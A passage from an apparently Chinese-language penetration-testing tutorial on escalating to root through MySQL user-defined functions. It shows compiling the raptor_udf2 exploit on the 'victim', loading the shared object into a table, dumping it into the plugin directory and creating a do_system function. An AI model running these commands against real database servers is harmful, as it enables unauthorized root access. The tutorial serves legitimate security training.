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" width="322" height="63" class="img_ev3q"></p>
<p>这个错误告诉我们 gcc 已经安装了，这就完美了！有了这些信息，我们知道我们将能够直接在受害者上编译我们的漏洞利用程序。</p>
<blockquote>
<p>如果 gcc 不在你的 PATH 中并且它说你需要安装它，那么不要立即放弃。您永远不知道 gcc 是否 正好位于系统上不在您的 PATH 中的其他位置。虽然可能性不大，但应该进行检查。</p>
</blockquote>
<p>要查找  系统上  gcc 的所有实例，我们可以使用 <strong>find</strong> 命令。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find / -iname &quot;gcc&quot; 2&gt;/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536210-1512418398-7b7c45539b00bb0e3d884cf803e1a7e9.png" width="636" height="128" class="img_ev3q"></p>
<p>我们可以看到这里找到了很多 <strong>gcc</strong> 的实例 ，然而其中很多都是目录。<strong>/usr/bin/gcc</strong> 是我们的 PATH 中的位置，这就是为什么我们可以通过调用命令 <strong>gcc</strong> 来执行它 ，而不需要二进制文件的完整路径。</p>
<blockquote>
<p>同样，如果我们发现 <strong>gcc</strong> 没有安装，我们应该进行上述搜索，然后检查每一个以确认 gcc 确实不在系统上，然后再放弃。</p>
</blockquote>
<p>由于我们发现受害者上安装了gcc ，因此我们可以继续按照注释中的步骤编译漏洞利用程序。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gcc -g -c raptor_udf2.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536331-13174873-14b943d4aada367f68758306f07c83e0.png" width="1022" height="154" class="img_ev3q"></p>
<p>当尝试编译此漏洞时，我们遇到错误，这种情况并不总是发生；但是，当出现这种情况时，它会提供有关如何解决问题的说明。</p>
<p>从输出中，我们可以看到第一个命令有效并且创建了.o目标文件，但在第二个命令中，提示该目标文件无法用于创建共享对象，需要使用**-fPIC<strong>重新编译。由于问题源于目标文件，因此我们需要将</strong>-fPIC**添加到创建目标文件时运行的第一个命令中。</p>
<p>为此，我们需要删除我们创建的目标文件并再次执行第一条命令，这次附带 <strong>-fPIC</strong>。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rm raptor_udf2.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gcc -g -c raptor_udf2.c -fPIC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183537573-1068782690-357560ad291bbd317c80d56f08de4edf.png" width="1024" height="302" class="img_ev3q"></p>
<p>这次没有报错，并且共享对象文件（<strong>.so</strong>）文件也已成功创建！</p>
<p>现在我们的漏洞已经创建，我们可以进入 MySQL，然后加载它并以 root 身份执行命令！</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4使用-udf-漏洞获取-root-shell"><strong><div id="id4">4、使用 UDF 漏洞获取 Root Shell</div></strong><a href="#4使用-udf-漏洞获取-root-shell" class="hash-link" aria-label="4使用-udf-漏洞获取-root-shell的直接链接" title="4使用-udf-漏洞获取-root-shell的直接链接">​</a></h2>
<p>至此，我们已经找到了漏洞利用的所有必要条件，如：<strong>MySQL以 root 身份运行、MySQL版本为5.x、MySQL超级用户凭据、安全文件权限设置为NULL（空白）、成功编译exploit。</strong></p>
<p>到这里，我们只需以超级用户的身份访问 MySQL，然后按照注释中的步骤即可实现命令执行。</p>
<p>首先，我们将以 root 身份访问 MySQL 服务并 use mysql 数据库，创建一个名为“foo”的表，然后将 raptor_udf2.so 漏洞加载到该表中。再次强调，我们不能仅仅从评论中复制粘贴，我们需要编辑与受害者和我们的漏洞位置相关的命令（/tmp）。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql -u root -p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use mysql;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">create table foo(line blob);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">insert into foo values(load_file(&#x27;/tmp/raptor_udf2.so&#x27;));</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536533-1237178193-063d829da0524d1b5e566d624c2be657.png" width="648" height="404" class="img_ev3q"></p>
<p>好吧…第一步已成功执行。现在我们需要做的就是将表 &quot;foo &quot;中的漏洞加载到 dumpfile 中，这基本上就是将文件复制到插件目录中，以便将共享对象的功能集成到 MySQL 中。之后，剩下的工作就是创建一个使用共享对象的函数，然后在获得 root shell 之前执行 POC 命令！</p>
<blockquote>
<p>之前，在我们最初的枚举中，我们检查了插件目录。这对于这一步很重要，因为我们的插件文件夹位置与注释中的位置不同。</p>
</blockquote>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536535-356831657-54ac8ec90af2c15d53fb4b4d6e7de746.png" width="1024" height="105" class="img_ev3q"></p>
<p>在这里我们可以看到我们又遇到了一个错误！一般来说，这会正常工作，不会出现任何错误；然而，在极少数情况下确实会发生这种情况，实际上有一个非常简单的修复方法。由于该服务以 root 身份运行，因此我们只需在 MySQL 中执行简单的复制即可将漏洞利用程序复制到插件目录中。</p>
<p>快速检查插件目录，我们可以看到，出现错误的原因是因为文件被转储到插件目录中的字节大小为 1。</p>
